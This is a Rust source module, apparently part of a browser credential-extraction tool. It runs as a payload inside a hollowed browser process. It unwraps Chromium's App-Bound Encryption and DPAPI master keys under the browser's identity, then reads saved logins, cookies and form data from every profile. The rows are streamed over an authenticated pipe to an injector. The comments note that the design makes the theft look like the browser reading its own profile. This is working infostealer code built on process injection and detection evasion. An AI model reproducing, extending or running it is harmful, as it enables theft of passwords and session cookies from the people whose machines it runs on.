//! The payload half of the in-browser run: when this binary starts inside a
//! hollowed browser process, it performs the ENTIRE credential-store
//! extraction from within the browser's identity and streams the rows back
//! over the authenticated pipe.
//!
//! Everything sensitive happens here, in a process whose image path IS the
//! browser: reading `Local State`, unwrapping the master keys (the ABE
//! elevator COM call — which requires this identity — and DPAPI), and
//! opening `Login Data`/`Cookies`/`Web Data`. To any observer, the browser is
//! reading its own profile.
//!
//! The payload is its own trust boundary: it re-validates the request's
//! config BEFORE any secret is touched (the injector's checks are not relied
//! on), and every frame it emits carries the per-run auth token plus a
//! sequence number. Detection is the mailbox marker pair:
//! both environment variables must be present (one stray variable must never
//! flip a normal process into payload mode). This code stays silent — the
//! hollowed process inherited the browser's stdio.
#![allow(unsafe_code)]

use std::time::Duration;

use serde_json::Value;

use crate::crypt::KeyBag;
use crate::inventory::{self, Browser};
use crate::local_state;
use crate::model::ProfileSummary;
use crate::options::RunOptions;
use crate::stores;
use crate::wire::{self, Emitter};

use super::conduit::{self, Client};
use super::{dpapi, elevator, postbox};

/// Whether this process started as a hollowed payload: BOTH markers must be
/// present.
#[must_use]
pub fn started_as_payload() -> bool {
    std::env::var_os(postbox::MAILBOX_ENV).is_some()
        && std::env::var_os(conduit::PIPE_ENV).is_some()
}

/// Runs the payload protocol and exits the process (never returns). Any
/// non-completion maps to a failed attempt at the injector.
pub fn run_payload() -> ! {
    let code = match payload_main() {
        Ok(()) => 0,
        Err(_) => 3,
    };
    std::process::exit(code);
}

fn payload_main() -> anyhow::Result<()> {
    let raw = std::env::var(postbox::MAILBOX_ENV)?;
    let base = usize::from_str_radix(raw.trim_start_matches("0x"), 16)?;
    // Read our own mailbox page (the injector verified placement at our fixed
    // address before resuming us).
    // SAFETY: the page was committed at this address in THIS process before
    // our entry point ran; `base..base + MAILBOX_SIZE` is mapped (checked by
    // the injector, and a foreign/unmapped read here would only fault our
    // own hollowed process, which is already a failed attempt).
    let page = unsafe { std::slice::from_raw_parts(base as *const u8, postbox::MAILBOX_SIZE) };
    let (raw_request, _response) =
        postbox::split_page(page).ok_or_else(|| anyhow::anyhow!("mailbox marker missing"))?;
    let (browser_id, blob) =
        postbox::decode_request(raw_request).ok_or_else(|| anyhow::anyhow!("request malformed"))?;
    let mut request =
        postbox::decode_blob(&blob).ok_or_else(|| anyhow::anyhow!("request blob malformed"))?;
    request.browser_id = browser_id;
    let token = wire::hex_encode(&request.token);

    // Fatal-error reporting when the pipe itself is unreachable: post the
    // reason to the mailbox (the injector reads it after a stream failure).
    match run_exchange(&request, &token) {
        Ok(()) => Ok(()),
        Err(err) => {
            write_response(base, false, err.to_string().as_bytes());
            Err(err)
        }
    }
}

/// Writes the fatal-error response into our own mailbox page.
fn write_response(base: usize, ok: bool, payload: &[u8]) {
    let record = postbox::encode_response(ok, payload);
    // SAFETY: the response region within our own mapped mailbox page.
    let at = unsafe {
        std::slice::from_raw_parts_mut((base + postbox::RESPONSE_OFFSET) as *mut u8, record.len())
    };
    at.copy_from_slice(&record);
}

/// The full extraction: config re-validation, key resolution, then every
/// profile's credential stores streamed home.
fn run_exchange(request: &postbox::Request, token: &str) -> anyhow::Result<()> {
    let pipe_name = std::env::var(conduit::PIPE_ENV)?;
    let pipe = Client::connect(&pipe_name, Duration::from_secs(10))?;
    let mut emitter = Emitter::new(token);

    // CONFIG RE-VALIDATION FIRST: re-check the request at this trust boundary
    // — before reading Local State or calling DPAPI/COM. The injector only
    // launches payloads for decryption-enabled, selected browsers, but the
    // payload does not rely on that.
    let opts: RunOptions = serde_json::from_str(&request.options_json).unwrap_or_default();
    if !opts.decrypt || !opts.wants_browser(&request.browser_id) {
        send(
            &pipe,
            &mut emitter,
            serde_json::json!({ "t": "err", "m": "unauthorized request" }),
        )?;
        pipe.flush();
        anyhow::bail!("request failed config validation");
    }
    let mut browser = inventory::descriptor_for(&request.browser_id).ok_or_else(|| {
        anyhow::anyhow!(
            "browser root not found for {} ({} candidates visible to payload)",
            request.browser_id,
            inventory::candidate_count()
        )
    })?;
    // The injector's per-user discovery wins over this process's own
    // environment (which resolves to the SPAWNING user's hive).
    browser.user_data = request.user_data.clone();

    let (bag, status) = resolve_keys(&browser);
    send(
        &pipe,
        &mut emitter,
        serde_json::json!({ "t": "status", "key": status }),
    )?;
    if bag.is_empty() {
        // Report the failure so the injector treats the attempt as failed and
        // falls back to local counts-only — a bare `done` would read as a
        // successful extraction of NOTHING, silently zeroing every count.
        send(
            &pipe,
            &mut emitter,
            serde_json::json!({ "t": "err", "m": status }),
        )?;
        pipe.flush();
        anyhow::bail!("key resolution failed: {status}");
    }

    let profiles = inventory::profiles(&browser);
    let mut errors: Vec<String> = Vec::new();
    for profile in &profiles {
        let mut summary = ProfileSummary {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            display_name: profile.display_name.clone(),
            path: profile.path.to_string_lossy().into_owned(),
            is_default: profile.is_default,
            ..ProfileSummary::default()
        };
        // Stream rows as they are extracted; a failed frame aborts the run
        // (the injector treats a truncated stream as an attempt failure).
        let mut send_err: Option<anyhow::Error> = None;
        stores::chromium::credential_rows(
            &browser,
            profile,
            &bag,
            &opts,
            &mut summary,
            &mut errors,
            &mut |row| {
                if send_err.is_none() {
                    let value = serde_json::to_value(&row).unwrap_or(Value::Null);
                    if let Err(err) = send(
                        &pipe,
                        &mut emitter,
                        serde_json::json!({ "t": "row", "r": value }),
                    ) {
                        send_err = Some(err);
                    }
                }
            },
        );
        if let Some(err) = send_err {
            return Err(err);
        }
        send(
            &pipe,
            &mut emitter,
            serde_json::json!({ "t": "profile", "p": summary }),
        )?;
    }
    // Store-level failures travel as notes so the injector can record them
    // (an unreadable store is not an empty one).
    for error in &errors {
        send(
            &pipe,
            &mut emitter,
            serde_json::json!({ "t": "note", "m": error }),
        )?;
    }
    send(&pipe, &mut emitter, serde_json::json!({ "t": "done" }))?;
    pipe.flush();
    Ok(())
}

/// Unwraps BOTH provider keys from inside the browser's identity: current
/// Chromium registers DPAPI and App-Bound simultaneously, and a migrated
/// profile holds v20 rows (ABE key) and v10 rows (DPAPI key) at once. The
/// status string reports each provider's outcome ("abe+dpapi", "abe",
/// "dpapi", or the error notes).
fn resolve_keys(browser: &Browser) -> (KeyBag, String) {
    let wrapped = local_state::wrapped_keys(&browser.user_data);
    if wrapped.is_empty() {
        return (
            KeyBag::default(),
            "unavailable: no os_crypt key in Local State".to_string(),
        );
    }
    let mut bag = KeyBag::default();
    let mut notes: Vec<String> = Vec::new();
    if let Some(blob) = &wrapped.app_bound {
        match &browser.abe {
            Some(identity) => match elevator::unwrap(identity, blob) {
                Ok(raw) if raw.len() == 32 => {
                    bag.app_bound = crate::crypt::bag_key32(raw);
                    notes.push("abe".to_string());
                }
                Ok(_) => {
                    notes.push("error: elevator returned an unexpected key length".to_string())
                }
                Err(err) => notes.push(format!("error: elevator decrypt failed: {err:#}")),
            },
            None => notes.push("unsupported: no ABE identity for browser".to_string()),
        }
    }
    if let Some(blob) = &wrapped.dpapi {
        match dpapi::unprotect(blob) {
            Ok(raw) if raw.len() == 32 => {
                bag.dpapi = crate::crypt::bag_key32(raw);
                notes.push("dpapi".to_string());
            }
            Ok(_) => notes.push("error: DPAPI returned an unexpected key length".to_string()),
            Err(err) => notes.push(format!("error: DPAPI unwrap failed: {err:#}")),
        }
    }
    (bag, notes.join("+"))
}

/// Sends one JSON frame (stamped with auth + sequence); failures propagate
/// (the run aborts).
fn send(pipe: &Client, emitter: &mut Emitter, value: Value) -> anyhow::Result<()> {
    let bytes = serde_json::to_vec(&emitter.stamp(value))?;
    pipe.write_frame(&bytes)
}
